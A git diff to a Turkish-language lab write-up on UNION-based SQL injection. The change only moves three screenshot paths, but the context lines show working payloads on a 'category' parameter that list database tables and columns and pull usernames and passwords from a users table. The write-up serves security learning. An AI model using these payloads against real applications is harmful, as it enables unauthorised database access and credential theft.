@@ -24,7 +24,7 @@ Uygulama filtreleme için kullanılan `category` parametresini doğrulamadan SQL
 GET /filter?category=' UNION SELECT table_name,null FROM information_schema.tables-- HTTP/2
 ```
 
-![Tablo isimleri listeleniyor](images/lab5_1.png)
+![Tablo isimleri listeleniyor](images/lab5/1.png)
 
 - Bir tablo için sütunları listelemek için:
 
@@ -32,7 +32,7 @@ GET /filter?category=' UNION SELECT table_name,null FROM information_schema.tabl
 GET /filter?category=' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users_rxikep'-- HTTP/2
 ```
 
-![Sütun isimleri listeleniyor](images/lab5_2.png)
+![Sütun isimleri listeleniyor](images/lab5/2.png)
 
 - Kullanıcı bilgilerini çıkarmak için:
 
@@ -40,7 +40,7 @@ GET /filter?category=' UNION SELECT column_name,null FROM information_schema.col
 GET /filter?category=' UNION SELECT username_hxqyez,password_tlivgi FROM users_rxikep-- HTTP/2
 ```
 
-![Kullanıcı verileri döndürülüyor](images/lab5_3.png)
+![Kullanıcı verileri döndürülüyor](images/lab5/3.png)
 
 ## 5. Sonuç
 
